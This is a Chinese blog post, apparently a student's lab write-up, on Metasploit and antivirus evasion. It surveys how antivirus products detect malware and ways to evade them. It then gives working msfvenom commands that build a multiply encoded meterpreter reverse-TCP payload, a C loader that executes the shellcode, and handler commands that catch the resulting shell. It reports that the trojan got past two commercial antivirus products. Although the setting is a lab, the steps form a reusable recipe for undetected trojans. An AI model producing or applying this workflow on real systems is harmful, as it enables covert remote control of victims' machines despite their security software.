> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.lz80.com](https://www.lz80.com/21588.html)

> 写在前面 最近学了学 msf, 学习了一些简单的模块使用以及渗透、提权、免杀，并使用靶场进行了一次小小的实战，写篇文章记录下。

写在前面
----

最近学了学 msf, 学习了一些简单的模块使用以及渗透、提权、免杀，并使用靶场进行了一次小小的实战，写篇文章记录下。

![](https://image.3001.net/images/20210420/1618921644_607ec8ac2495d0ac1acc1.jpeg!small)

MSF 是什么
-------

Metasploit 是一个免费的、可下载的渗透测试框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数千个已知软件漏洞的专业级漏洞攻击工具，并且 MSF 团队始终在更新 MSF 的漏洞

库，这使得 MSF 始终充满生机。通俗的讲，MSF 就是一个集成了渗透测试全流程的渗透工具，理论上讲，我们可以只依靠 MSF 完成从信息收集到最终的制作后门并清理入侵痕迹的渗透测试全过程。

何为免杀
----

首先，免杀是杀毒软件或者说反病毒软件的对立面，可以理解为反反病毒技术或者反杀毒技术，最早可以追溯到 2002 年 7 月国内第一个真正意义上的变种病毒 “中国黑客 II” 的出现，而想要实现免杀，首先我们肯

定要清楚地了解杀毒软件针对病毒的检测机制

杀软检测病毒方式
--------

一般来说杀软的检测方式有以下三种：

### 特征代码法

依照的原理便是同一种或者同一类的病毒会有一部分核心代码会相同或者相似，比如我们在 > https://www.freebuf.com/articles/network/268713.html 中提到的 payload，这些 payload 的最终目的只有

一个，那就是命令执行，那么既然明确了目的，那么这些木马关于执行命令部分的代码就一定会有相似或者相同的部分，杀毒软件可以利用这一点完成对病毒的检测

### 哈希校验法

此方法通过计算文件哈希值并定期或者需要的时候调用以校验文件一段时间内的哈希值是否有变化，如果有变化，那么文件便有可能被入侵或者挂马，接下来就需要进行进一步的检查

### 行为检测法

此方法根据病毒软件所经常进行的活动进行检测，例如：命令执行，信息获取，权限提升

### 主动防御法

HIPS(主机入侵防御系统)，如果以上行为都无法精准的检测出软件是否为病毒软件，那么还可以将嫌疑软件上传云端虚拟环境中试运行，如果云端虚拟环境被破坏，那么基本可以断定软件为病毒软件

免杀方式
----

针对上文提到的几种杀软的检测方法，大约出现了以下五种免杀技术

### 修改特征码

首先，免杀技术的核心就是破坏或者是修改特征，这个特征值的是广义上的特征，包括特征码或者是特征行为，只要破坏了木马或者病毒所固有的特征码，并保证其原有的功能没有被破坏，木马（病毒）可以

正常运行，那么我们就完成了一次成功的免杀。

（特征码：能识别一个程序是病毒的一段不大于 64 字节的特征串）

举个例子来说：著名的 “灰鸽子” 病毒的一大特征码就是在上传后在其某一地址中会出现 “灰鸽子上线成功!” 字样，这个字样其实对木马本身的运行并没有任何实质性的作用，那么将其删除不就可以绕过以这一

句话为特征码检测的杀毒软件的检测了吗

当然，这只是最简单的例子，大部分杀软所检测的特征码就是针对病毒运行的核心区块检测的，想修改这些代码就不是直接删除这么简单，这种情况下一般会采取编码或者编译的方式对病毒进行免杀处理

### 垃圾代码免杀

垃圾代码顾名思义，是一堆没有用处的代码，那么这些代码添加到病毒中会有什么用处呢？

其实，杀软对于文件的检测不可能是遍历文件从头到尾的所有字节，这样既会花费大量时间，又会占用大量的系统资源，所以，目前主流杀软对于特征码的的检测是限定在某一偏移量内的，针对这个方法，如

果我们在特征代码前加入大量对病毒运行没有影响的垃圾指令来将我们的特征码” 挤” 出那一段偏移量，以此来达到免杀的目的。

### 加壳免杀

简单来说就是软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件的所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。

### 资源修改免杀

某些杀软可能会像网站的 waf 一样存在白名单机制，比如曾经把木马图标换为 360 的图标就能过 360 的检测，使用这种方法可以找来多个合法正版且正常的软件，将他们的资源加入到自己的木马中，比如图标，

版本，数字签名等

### 二次编译免杀

metasploit 的 msfvenom 提供了多种格式的 payload 和 encoder，生成的 shellcode 也为二次加工提供了很大便利，但同时 msf 的编码库和病毒库也被各大厂商盯得死死的。

而 shikata_ga_nai 是 msf 中唯一的评价是 excellent 的编码器（我们在下文的靶场实战演示中会用到），这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样。还可以利用管道进行多重编码进行免杀。

但需要注意的是目前 msfvenom 的 encoder 特征基本都进入了杀软的漏洞库，所以很难实现单一 encoder 编码（无论编码几次）而绕过杀软，所以对 shellcode 进行进一步修改编译成了 msf 免杀的主流。

不仅是二次编译，整个免杀技术其实都是黑客与反病毒厂商无时无刻不再进行的博弈，现如今很难通过某一种单一的免杀技术来绕过主流杀软了，所以在成功的免杀中往往是采用了两种甚至更多的免杀方式来

对我们的木马进行处理，本文所进行的实战便是借助于 msfvenom 的编码与 C、C#、python 等语言对 shellcode 进行二次编码而达到免杀。

靶场实战
----

啰嗦了这么多理论，下面开始实战吧~

本次实战所用工具：

win7 虚拟机，kali 虚拟机，msf，360, 电脑管家，Microsoft Visual Studio

本次实战网络拓扑图：

![](https://image.3001.net/images/20210420/1618922062_607eca4e8d0749681f3e3.png!small)

首先，在攻击机中使用 msfvenom 生成一个普通的木马 (只经过简单的编码) 来测试一下 360 和电脑管家的威力

```
msfvenom -p windows/meterpreter/revse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.119.130 lport=1234 -f exe > haixian.exe
```

`-i 指定编码次数 -e 指定编码格式`

![](https://image.3001.net/images/20210420/1618921677_607ec8cd15c1342306261.png!small)

先把木马复制到本机，本机的 360 报毒

![](https://image.3001.net/images/20210420/1618921703_607ec8e71639a7e1e6e5d.png!small)

再粘贴到受害机中，分别使用 360，电脑管家扫描，全都报毒

![](https://image.3001.net/images/20210420/1618921714_607ec8f238249d691fcb8.png!small)

![](https://image.3001.net/images/20210420/1618921717_607ec8f56c2fce9ed4588.png!small)

接下来开始免杀操作：

输入命令

```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b ‘\x00’ lhost=192.168.119.130 lport=1234 -f c
```

`-b 避免使用的字符 -f 指定输出格式`

![](https://image.3001.net/images/20210420/1618921744_607ec910cf9eccfe51980.png!small)

此时输出的便是 c 语言格式并经过 shikata_ga_nai 编码 15 次的 payload

接下来打开 Visual C++ 选择新建文件 ->Win32 Application-> 填入工程名（注意只能用英文输入法）-> 平台选择 Win32-> 确定

![](https://image.3001.net/images/20210420/1618921754_607ec91a584c6de54a85f.png!small)

选择 FileView->haixian files->source files->haixian.cpp

将其中内容替换为

```
#include "stdafx.h"
#include <stdio.h>
#pragma comment( linker, "/subsystem:"windows" /entry:"mainCRTStartup"")
unsigned char buf[] =
（这里放生成好的数组）
main()
{
((void(*)(void))&buf)();
}
```

这段代码的意思简单来说就是执行数组（注意第六行的括号要去掉，否则会编译不成功）

![](https://image.3001.net/images/20210420/1618921770_607ec92a242a77189c9f1.png!small)

![](https://image.3001.net/images/20210420/1618921774_607ec92e009be0261c23d.png!small)

下面分别组建并编译 stdafx.cpp 与 haixian.cpp

![](https://image.3001.net/images/20210420/1618922063_607eca4f3c5551d7be20f.png!small)

![](https://image.3001.net/images/20210420/1618921810_607ec952a634530d83f05.png!small)

接下来在工程文件夹下的 Debug 文件夹中可以看到 haixian.exe

![](https://image.3001.net/images/20210420/1618921850_607ec97a3b8dd0c63c47e.png!small)

将 haixian.exe 粘贴到受害机里使用 360 和电脑管家进行检测，成功绕过!

![](https://image.3001.net/images/20210420/1618921868_607ec98c3bbcfff720c3d.png!small)

![](https://image.3001.net/images/20210420/1618921871_607ec98fee5b6a2ab9dbf.png!small)

攻击机设置监听

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.119.130
set lport 1234
run
```

![](https://image.3001.net/images/20210420/1618921892_607ec9a416615baf37a0c.png!small)

在受害机中运行免杀马（不用关闭杀软）

可以看到在受害机反弹的 shell

![](https://image.3001.net/images/20210420/1618921900_607ec9ac33cb00b366f89.png!small)

至此，我们完成了对木马的免杀处理并在受害机杀软环境下成功运行木马

写在后面
----

此文为笔者作为一名渗透小白所写的学习记录，路过大神若有高见欢迎斧正

下篇文章写内网渗透，敬请期待~~~